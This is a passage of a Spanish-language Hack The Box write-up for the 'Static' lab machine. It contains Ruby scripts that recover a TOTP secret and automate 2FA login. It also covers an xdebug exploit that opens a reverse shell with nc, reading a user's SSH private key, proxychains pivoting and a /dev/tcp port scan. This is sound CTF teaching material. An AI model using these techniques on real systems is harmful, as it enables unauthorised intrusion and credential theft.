</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#66d9ef>URI</span>(<span style=color:#e6db74>&#34;http://</span><span style=color:#e6db74>#{</span>host<span style=color:#e6db74>}</span><span style=color:#e6db74>/.ftp_uploads/</span><span style=color:#e6db74>#{</span>gz_file<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>res <span style=color:#f92672>=</span> <span style=color:#66d9ef>Net</span><span style=color:#f92672>::</span><span style=color:#66d9ef>HTTP</span><span style=color:#f92672>.</span>get(url)
</span></span><span style=display:flex><span><span style=color:#66d9ef>File</span><span style=color:#f92672>.</span>binwrite(gz_file, res)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>File</span><span style=color:#f92672>.</span>open(gz_file, <span style=color:#e6db74>&#39;rb&#39;</span>) { <span style=color:#f92672>|</span>f<span style=color:#f92672>|</span> <span style=color:#66d9ef>File</span><span style=color:#f92672>.</span>binwrite(tmp, f<span style=color:#f92672>.</span>read<span style=color:#f92672>.</span>gsub(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)) }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>Zlib</span><span style=color:#f92672>::</span><span style=color:#66d9ef>GzipReader</span><span style=color:#f92672>.</span>open(tmp) <span style=color:#66d9ef>do</span> <span style=color:#f92672>|</span>f<span style=color:#f92672>|</span>
</span></span><span style=display:flex><span>  sql <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read<span style=color:#f92672>.</span>strip
</span></span><span style=display:flex><span>  puts <span style=color:#e6db74>&#34;[+] Patched </span><span style=color:#e6db74>#{</span>gz_file<span style=color:#e6db74>}</span><span style=color:#e6db74> file. Found </span><span style=color:#e6db74>#{</span>sql_file<span style=color:#e6db74>}</span><span style=color:#e6db74>:</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>#{</span>sql<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>File</span><span style=color:#f92672>.</span>open(sql_file, <span style=color:#e6db74>&#39;w&#39;</span>) { <span style=color:#f92672>|</span>ff<span style=color:#f92672>|</span> ff<span style=color:#f92672>.</span>write(sql) }
</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
</span></span></code></pre></div><p>Ahora ejecutamos el <em>script</em> y obtenemos el fichero <code>db.sql</code> íntegro:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ ruby patch_gz.rb
</span></span><span style=display:flex><span>[*] Downloading corrupted db.sql.gz file
</span></span><span style=display:flex><span>[+] Patched db.sql.gz file. Found db.sql:
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>CREATE</span> <span style=color:#66d9ef>DATABASE</span> <span style=color:#66d9ef>static</span>;
</span></span><span style=display:flex><span>USE <span style=color:#66d9ef>static</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>CREATE</span> <span style=color:#66d9ef>TABLE</span> users ( id smallint unsigned <span style=color:#66d9ef>not</span> <span style=color:#66d9ef>null</span> auto_increment, username varchar(<span style=color:#ae81ff>20</span>) <span style=color:#66d9ef>not</span> <span style=color:#66d9ef>null</span>, password varchar(<span style=color:#ae81ff>40</span>) <span style=color:#66d9ef>not</span> <span style=color:#66d9ef>null</span>, totp varchar(<span style=color:#ae81ff>16</span>) <span style=color:#66d9ef>not</span> <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>primary</span> <span style=color:#66d9ef>key</span> (id) );
</span></span><span style=display:flex><span><span style=color:#66d9ef>INSERT</span> <span style=color:#66d9ef>INTO</span> users ( id, username, password, totp ) <span style=color:#66d9ef>VALUES</span> ( <span style=color:#66d9ef>null</span>, <span style=color:#e6db74>&#39;admin&#39;</span>, <span style=color:#e6db74>&#39;d033e22ae348aeb5660fc2140aec35850c4da997&#39;</span>, <span style=color:#e6db74>&#39;orxxi4c7orxwwzlo&#39;</span> );
</span></span></code></pre></div><p>Este archivo SQL crea una tabla llamada <code>users</code> con columnas <code>id</code>, <code>username</code>, <code>password</code> y <code>totp</code>. Y luego se añade un nuevo usuario con nombre <code>admin</code>. Aunque tenemos el <em>hash</em> de la contraseña, si lo rompemos obtendremos <code>admin</code> (algo que ya sabemos). El otro valor es <code>orxxi4c7orxwwzlo</code> para la columna <code>totp</code>.</p><h2 id=gestionando-2fa>Gestionando 2FA</h2><p>Este valor de <code>totp</code> corresponde a la clave utilizada para el algoritmo de TOTP (<em>Time-based One-Time Password</em>). El algoritmo TOTP está implementado en librerías de Python y Ruby (entre otras); y también hay apps como Google Authenticator o soluciones online.</p><p>Como estamos utilizando Ruby esta vez, hagamos esto de TOTP también en Ruby. Primero necesitamos instalar <code>rotp</code> con <code>gem install rotp</code>. Y luego, desde <code>irb</code> (Ruby interactivo) podemos coger el código:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ irb
</span></span><span style=display:flex><span>irb(main):001:0&gt; require &#39;rotp&#39;
</span></span><span style=display:flex><span>=&gt; true
</span></span><span style=display:flex><span>irb(main):002:0&gt; totp = ROTP::TOTP.new(&#39;orxxi4c7orxwwzlo&#39;)
</span></span><span style=display:flex><span>=&gt; #&lt;ROTP::TOTP:0x0000000147827380 @digest=&#34;sha1&#34;, @digits=6, @interval=30, @issuer=nil, @secret=&#34;orxxi4c7orxwwzlo&#34;&gt;
</span></span><span style=display:flex><span>irb(main):003:0&gt; totp.now
</span></span><span style=display:flex><span>=&gt; &#34;309130&#34;
</span></span><span style=display:flex><span>irb(main):004:0&gt; totp.now
</span></span><span style=display:flex><span>=&gt; &#34;860691&#34;
</span></span></code></pre></div><p>Desafortunadamente, estos códigos no funcionan. Probé con otras soluciones, pero los códigos eran los mismos, o sea que el problema no era de Ruby.</p><p>Entonces, me di cuenta de que como es un OTP basado en tiempo, necesitaba tener la misma fecha y hora que la máquina. Uno puede saber la fecha y hora actual de la máquina desde las cabeceras de respuesta HTTP si está habilitado. Por ejemplo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ curl 10.10.10.246:8080 -I
</span></span><span style=display:flex><span>HTTP/1.1 200 OK
</span></span><span style=display:flex><span>Date: Fri, 10 Dec 2021 22:22:22 GMT
</span></span><span style=display:flex><span>Server: Apache/2.4.38 (Debian)
</span></span><span style=display:flex><span>Content-Type: text/html; charset=UTF-8
</span></span></code></pre></div><p>Ahora podemos añadir esta fecha y hora al comando de Ruby y obtener un TOTP válido:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>irb(main):006:0&gt; require &#39;time&#39;
</span></span><span style=display:flex><span>=&gt; true
</span></span><span style=display:flex><span>irb(main):007:0&gt; date = Time.parse(&#39;Fri, 10 Dec 2021 22:22:22 GMT&#39;).to_i
</span></span><span style=display:flex><span>=&gt; 1639174942
</span></span><span style=display:flex><span>irb(main):008:0&gt; totp.at(date)
</span></span><span style=display:flex><span>=&gt; &#34;626733&#34;
</span></span></code></pre></div><p>Durante los intentos, probé a añadir el cálculo del TOTP y el proceso de inicio de sesión (con <code>admin:admin</code>) en el <em>script</em> de Ruby para verificar que el problema no era de tiempo entre inicio de sesión y envío del código de 2FA. Como resultado, conseguí que el proceso de inicio de sesión fuera automático; y cuando descubrí el problema, ya tenía un <em>script</em> funcional para iniciar sesión como <code>admin</code> con las siguientes líneas:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-ruby data-lang=ruby><span style=display:flex><span>require <span style=color:#e6db74>&#39;rotp&#39;</span>
</span></span><span style=display:flex><span>require <span style=color:#e6db74>&#39;time&#39;</span>
</span></span><span style=display:flex><span>require <span style=color:#e6db74>&#39;uri&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>require <span style=color:#e6db74>&#39;net/http&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;10.10.10.246:8080&#39;</span>
</span></span><span style=display:flex><span>totp <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;orxxi4c7orxwwzlo&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#66d9ef>URI</span>(<span style=color:#e6db74>&#34;http://</span><span style=color:#e6db74>#{</span>host<span style=color:#e6db74>}</span><span style=color:#e6db74>/vpn/login.php&#34;</span>)
</span></span><span style=display:flex><span>res <span style=color:#f92672>=</span> <span style=color:#66d9ef>Net</span><span style=color:#f92672>::</span><span style=color:#66d9ef>HTTP</span><span style=color:#f92672>.</span>post(url, <span style=color:#e6db74>&#39;username=admin&amp;password=admin&amp;submit=Login&#39;</span>)
</span></span><span style=display:flex><span>cookie <span style=color:#f92672>=</span> res<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;Set-Cookie&#39;</span><span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>server_time <span style=color:#f92672>=</span> <span style=color:#66d9ef>Time</span><span style=color:#f92672>.</span>parse(res<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;Date&#39;</span><span style=color:#f92672>]</span>)<span style=color:#f92672>.</span>to_i
</span></span><span style=display:flex><span>puts <span style=color:#e6db74>&#39;[+] Login successful&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>code <span style=color:#f92672>=</span> <span style=color:#66d9ef>ROTP</span><span style=color:#f92672>::</span><span style=color:#66d9ef>TOTP</span><span style=color:#f92672>.</span>new(totp)<span style=color:#f92672>.</span>at(server_time)
</span></span><span style=display:flex><span>puts <span style=color:#e6db74>&#34;[*] Generating TOTP code: </span><span style=color:#e6db74>#{</span>code<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>res <span style=color:#f92672>=</span> <span style=color:#66d9ef>Net</span><span style=color:#f92672>::</span><span style=color:#66d9ef>HTTP</span><span style=color:#f92672>.</span>post(url, <span style=color:#e6db74>&#34;code=</span><span style=color:#e6db74>#{</span>code<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, { <span style=color:#e6db74>Cookie</span>: cookie })
</span></span><span style=display:flex><span>location <span style=color:#f92672>=</span> res<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;Location&#39;</span><span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>puts <span style=color:#e6db74>&#34;[+] 2FA successful. Go to http://</span><span style=color:#e6db74>#{</span>host<span style=color:#e6db74>}</span><span style=color:#e6db74>/vpn/</span><span style=color:#e6db74>#{</span>location<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>puts <span style=color:#e6db74>&#34;[+] Cookie: </span><span style=color:#e6db74>#{</span>cookie<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span></code></pre></div><p>El <em>script</em> retorna la URL a la que acceder (ya que el servidor aplica una redirección) y la <em>cookie</em> para mantener la autenticación:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ ruby login_2fa.rb
</span></span><span style=display:flex><span>[+] Login successful
</span></span><span style=display:flex><span>[*] Generating TOTP code: 508175
</span></span><span style=display:flex><span>[+] 2FA successful. Go to http://10.10.10.246:8080/vpn/panel.php
</span></span><span style=display:flex><span>[+] Cookie: PHPSESSID=1l5prlovq3bek3488ehmi03koj; path=/
</span></span></code></pre></div><p>Podemos ver un panel como este:</p><p><img src=/images/HTB/Static/Static-portal.png alt="Static Panel"></p><p>Aquí podemos descargar una VPN como archivo <code>.ovpn</code> (como el que se utiliza para conectarse a las máquinas de Hack The Box). Podemos ver también que hay algunas máquinas que deberían ser accesibles utilizando la VPN.</p><p>Solo por completar el <em>script</em> de Ruby, decidí poner todo junto. Como resultado, el <em>script</em> se descarga y parchea el archivo Gzip, extrae la clave de TOTP del contenido SQL, inicia sesión con credenciales y 2FA y finalmente descarga el archivo de VPN como <code>static.ovpn</code>. El <em>script</em> se llama <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static/get_vpn.rb><code>get_vpn.rb</code></a> (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static#get_vpnrb>aquí</a>).</p><h2 id=conexión-a-la-vpn-de-static>Conexión a la VPN de Static</h2><p>Si ejecutamos <code>openvpn static.ovpn</code>, veremos algunos errores. El problema es que el archivo contiene un subdominio llamado <code>vpn.static.htb</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ head static.ovpn
</span></span><span style=display:flex><span>client
</span></span><span style=display:flex><span>dev tun9
</span></span><span style=display:flex><span>proto udp
</span></span><span style=display:flex><span>remote vpn.static.htb 1194
</span></span><span style=display:flex><span>resolv-retry infinite
</span></span><span style=display:flex><span>nobind
</span></span><span style=display:flex><span>user nobody
</span></span><span style=display:flex><span>group nogroup
</span></span><span style=display:flex><span>persist-key
</span></span><span style=display:flex><span>persist-tun
</span></span></code></pre></div><p>Por tanto, tenemos que añadir el subdominio a <code>/etc/hosts</code>. Una vez hecho, la conexión VPN funciona correctamente y nos otorga una dirección IP <code>172.30.0.9</code>.</p><p>Sin embargo, no tenemos conexión con las direcciónes IP listadas en el portal. Podemos arreglarlo añadiendo rutas a mano:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span># route add -net 172.20.0.0 172.30.0.1 255.255.255.0
</span></span><span style=display:flex><span>add net 172.20.0.0: gateway 172.30.0.1
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ ping -c <span style=color:#ae81ff>1</span> 172.20.0.10
</span></span><span style=display:flex><span>PING 172.20.0.10 (172.20.0.10): 56 data bytes
</span></span><span style=display:flex><span>64 bytes from 172.20.0.10: icmp_seq=0 ttl=63 time=50.941 ms
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>--- 172.20.0.10 ping statistics ---
</span></span><span style=display:flex><span>1 packets transmitted, 1 packets received, 0.0% packet loss
</span></span><span style=display:flex><span>round-trip min/avg/max/stddev = 50.941/50.941/50.941/0.000 ms
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ ping -c <span style=color:#ae81ff>1</span> 172.20.0.11
</span></span><span style=display:flex><span>PING 172.20.0.11 (172.20.0.11): 56 data bytes
</span></span><span style=display:flex><span>64 bytes from 172.20.0.11: icmp_seq=0 ttl=63 time=51.849 ms
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>--- 172.20.0.11 ping statistics ---
</span></span><span style=display:flex><span>1 packets transmitted, 1 packets received, 0.0% packet loss
</span></span><span style=display:flex><span>round-trip min/avg/max/stddev = 51.849/51.849/51.849/0.000 ms
</span></span></code></pre></div><h2 id=comprometiendo-un-servidor-interno>Comprometiendo un servidor interno</h2><p>Después de un simple escaneo de <code>nmap</code> para la dirección IP <code>172.20.0.10</code>, vemos que se trata de un servidor web:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span># nmap -sS -p- -Pn -n 172.20.0.10
</span></span><span style=display:flex><span>Starting Nmap 7.92 ( https://nmap.org )
</span></span><span style=display:flex><span>Nmap scan report for 172.20.0.10
</span></span><span style=display:flex><span>Host is up (0.059s latency).
</span></span><span style=display:flex><span>Not shown: 65533 closed tcp ports (reset)
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Nmap done: 1 IP address (1 host up) scanned in 57.40 seconds
</span></span></code></pre></div><p>Este servidor muestra el siguiente listado de directorios:</p><p><img src=/images/HTB/Static/Static-web-index.png alt="Static web internal server"></p><p>El directorio <code>vpn</code> es el mismo de antes, por lo que no es interesante.</p><p>El archivo <code>info.php</code> muestra un <code>phpinfo()</code> con la configuración de PHP. Después de leer toda la información, descubrimos que <code>xdebug</code> está habilitado:</p><p><img src=/images/HTB/Static/Static-xdebug.png alt="Static web internal xdebug"></p><p>Esto es un problema porque podemos conectarnos al servidor por razones de &ldquo;depuración&rdquo; y ganar ejecución remota de comandos (RCE). Buscando por <em>exploits</em>, podemos encontrar <a href=https://github.com/gteissier/xdebug-shell>este</a>), el cual está hecho en Python versión 2. El <em>exploit</em> funciona y nos otorga una línea de comandos interactiva.</p><p>Decidí traducir el <em>script</em> a Python versión 3 y modificarlo para que me otorgara una <em>reverse shell</em> con <code>nc</code>, lo cual es más cómodo. El <em>exploit</em> resultante puede encontrarse en: <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static/xdebug_shell.py><code>xdebug_shell.py</code></a> (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static#xdebug_shellpy>aquí</a>).</p><p>Podemos utilizar este <em>exploit</em> para ganar acceso al servidor web interno (recuérdese que hay que utilizar la dirección IP que nos otorga la VPN de Static, no la de Hack The Box):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ python3 xdebug_shell.py http://172.20.0.10/info.php 172.30.0.9 <span style=color:#ae81ff>4444</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ nc -nlvp <span style=color:#ae81ff>4444</span>
</span></span><span style=display:flex><span>Ncat: Version 7.92 ( https://nmap.org/ncat )
</span></span><span style=display:flex><span>Ncat: Listening on :::4444
</span></span><span style=display:flex><span>Ncat: Listening on 0.0.0.0:4444
</span></span><span style=display:flex><span>Ncat: Connection from 172.30.0.1.
</span></span><span style=display:flex><span>Ncat: Connection from 172.30.0.1:55308.
</span></span><span style=display:flex><span>bash: cannot set terminal process group (37): Inappropriate ioctl for device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>www-data@web:/var/www/html$ script /dev/null -c bash
</span></span><span style=display:flex><span>script /dev/null -c bash
</span></span><span style=display:flex><span>Script started, file is /dev/null
</span></span><span style=display:flex><span>www-data@web:/var/www/html$ ^Z
</span></span><span style=display:flex><span>zsh: suspended  ncat -nlvp 4444
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ stty raw -echo; fg
</span></span><span style=display:flex><span>[1]  + continued  ncat -nlvp 4444
</span></span><span style=display:flex><span>                                 reset xterm
</span></span><span style=display:flex><span>www-data@web:/var/www/html$ export TERM=xterm
</span></span><span style=display:flex><span>www-data@web:/var/www/html$ export SHELL=bash
</span></span><span style=display:flex><span>www-data@web:/var/www/html$ stty rows 50 columns 158
</span></span></code></pre></div><p>Y aquí podemos encontrar la <em>flag</em> <code>user.txt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@web:/var/www/html$ ls -la
</span></span><span style=display:flex><span>total 16
</span></span><span style=display:flex><span>drwxr-xr-x 3 root root 4096 Apr  6  2020 .
</span></span><span style=display:flex><span>drwxr-xr-x 3 root root 4096 Jun 14  2021 ..
</span></span><span style=display:flex><span>-rw-r--r-- 1 root root   19 Apr  3  2020 info.php
</span></span><span style=display:flex><span>drwxr-xr-x 3 root root 4096 Jun 17  2020 vpn
</span></span><span style=display:flex><span>www-data@web:/var/www/html$ ls /home
</span></span><span style=display:flex><span>user.txt  www-data
</span></span><span style=display:flex><span>www-data@web:/var/www/html$ cat /home/user.txt
</span></span><span style=display:flex><span>c3f343befcac5fa92fb5373456e94247
</span></span></code></pre></div><p>Además, podemos obtener una clave <code>id_rsa</code> para el usuario <code>www-data</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@web:/var/www/html$ ls -la /home/www-data
</span></span><span style=display:flex><span>total 16
</span></span><span style=display:flex><span>drwxr-x--- 4 www-data www-data 4096 Jun 14  2021 .
</span></span><span style=display:flex><span>drwxr-xr-x 3 root     root     4096 Jun 14  2021 ..
</span></span><span style=display:flex><span>lrwxrwxrwx 1 root     root        9 Jun 14  2021 .bash_history -&gt; /dev/null
</span></span><span style=display:flex><span>drwx------ 2 www-data www-data 4096 Jun 14  2021 .cache
</span></span><span style=display:flex><span>drwx------ 2 www-data www-data 4096 Jun 14  2021 .ssh
</span></span><span style=display:flex><span>www-data@web:/var/www/html$ ls -la /home/www-data/.ssh
</span></span><span style=display:flex><span>total 20
</span></span><span style=display:flex><span>drwx------ 2 www-data www-data 4096 Jun 14  2021 .
</span></span><span style=display:flex><span>drwxr-x--- 4 www-data www-data 4096 Jun 14  2021 ..
</span></span><span style=display:flex><span>-rw-r--r-- 1 www-data www-data  390 Jun 14  2021 authorized_keys
</span></span><span style=display:flex><span>-rw------- 1 www-data www-data 1675 Jun 14  2021 id_rsa
</span></span><span style=display:flex><span>-rw-r--r-- 1 www-data www-data  390 Jun 14  2021 id_rsa.pub
</span></span></code></pre></div><p>Por tanto, podemos copiarla o transferirla y conectarnos por SSH. Podemos acceder desde la dirección IP 172.20.0.10:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ ssh -i id_rsa www-data@172.20.0.10
</span></span><span style=display:flex><span>www-data@web:~$
</span></span></code></pre></div><p>Pero también desde la dirección IP 10.10.10.246 y puerto 2222 (recuérdese que había dos servicios SSH en ejecución):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ ssh -i id_rsa www-data@10.10.10.246 -p <span style=color:#ae81ff>2222</span>
</span></span><span style=display:flex><span>www-data@web:~$
</span></span></code></pre></div><h2 id=enumeración-de-red>Enumeración de red</h2><p>Veamos qué interfaces de red tenemos:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@web:~$ ifconfig
</span></span><span style=display:flex><span>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
</span></span><span style=display:flex><span>        inet 172.20.0.10  netmask 255.255.255.0  broadcast 172.20.0.255
</span></span><span style=display:flex><span>        ether 02:42:ac:14:00:0a  txqueuelen 0  (Ethernet)
</span></span><span style=display:flex><span>        RX packets 286733  bytes 62939217 (62.9 MB)
</span></span><span style=display:flex><span>        RX errors 0  dropped 0  overruns 0  frame 0
</span></span><span style=display:flex><span>        TX packets 284115  bytes 109282923 (109.2 MB)
</span></span><span style=display:flex><span>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
</span></span><span style=display:flex><span>        inet 192.168.254.2  netmask 255.255.255.0  broadcast 192.168.254.255
</span></span><span style=display:flex><span>        ether 02:42:c0:a8:fe:02  txqueuelen 0  (Ethernet)
</span></span><span style=display:flex><span>        RX packets 16555  bytes 3910920 (3.9 MB)
</span></span><span style=display:flex><span>        RX errors 0  dropped 0  overruns 0  frame 0
</span></span><span style=display:flex><span>        TX packets 23781  bytes 10145337 (10.1 MB)
</span></span><span style=display:flex><span>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
</span></span><span style=display:flex><span>        inet 127.0.0.1  netmask 255.0.0.0
</span></span><span style=display:flex><span>        loop  txqueuelen 1000  (Local Loopback)
</span></span><span style=display:flex><span>        RX packets 576  bytes 38947 (38.9 KB)
</span></span><span style=display:flex><span>        RX errors 0  dropped 0  overruns 0  frame 0
</span></span><span style=display:flex><span>        TX packets 576  bytes 38947 (38.9 KB)
</span></span><span style=display:flex><span>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span></span></code></pre></div><p>Tenemos el siguiente esquema de red:</p><p><img src=/images/HTB/Static/Static-network.png alt="Network diagram"></p><p>Podemos conectarnos a <code>pki</code>, que tiene dirección IP <code>192.168.254.3</code>. Para realizar un escaneo de puertos podemos utilizar <code>nmap</code> con <code>proxychains</code> configurando un reenvío de puertos dinámico con SSH:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ ssh -fND <span style=color:#ae81ff>9050</span> -i id_rsa www-data@172.20.0.10
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span># proxychains4 -q nmap -sS -p- -vvv -Pn -n 192.168.254.3
</span></span><span style=display:flex><span>Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
</span></span><span style=display:flex><span>Starting Nmap 7.92 ( https://nmap.org )
</span></span><span style=display:flex><span>Initiating SYN Stealth Scan
</span></span><span style=display:flex><span>Scanning 192.168.254.3 [65535 ports]
</span></span><span style=display:flex><span>SYN Stealth Scan Timing: About 0.30% done
</span></span><span style=display:flex><span>Stats: 0:01:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
</span></span><span style=display:flex><span>SYN Stealth Scan Timing: About 0.39% done
</span></span><span style=display:flex><span>Stats: 0:02:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
</span></span><span style=display:flex><span>SYN Stealth Scan Timing: About 0.50% done
</span></span><span style=display:flex><span>^C
</span></span></code></pre></div><p>La idea era buena, pero el escaneo se demoraba muchísimo. Además, <code>nmap</code> con <code>proxychains</code> no funciona del todo bien a veces (puede reportar falsos positivos o no reportar puertos abiertos).</p><p>Utilizamos entonces un sencillo <em>script</em> en Bash y lo ejecutamos desde la máquina <code>web</code> para tener menor latencia:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> p in <span style=color:#e6db74>`</span>seq <span style=color:#ae81ff>1</span> 65535<span style=color:#e6db74>`</span>; <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>	echo -ne <span style=color:#e6db74>&#34;Trying </span>$p<span style=color:#e6db74>\r&#34;</span>
</span></span><span style=display:flex><span>	timeout <span style=color:#ae81ff>1</span> echo 2&gt;/dev/null &gt; /dev/tcp/192.168.254.3/$p <span style=color:#f92672>&amp;&amp;</span> echo <span style=color:#e6db74>&#34;Port: </span>$p<span style=color:#e6db74> OPEN&#34;</span> &amp;
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>; wait
</span></span></code></pre></div><p>Podemos transferir el <em>script</em> utilizando un servidor web con Python y <code>wget</code>, ya que la máquina no tiene <code>vim</code> ni <code>nano</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@web:~$ cd /tmp
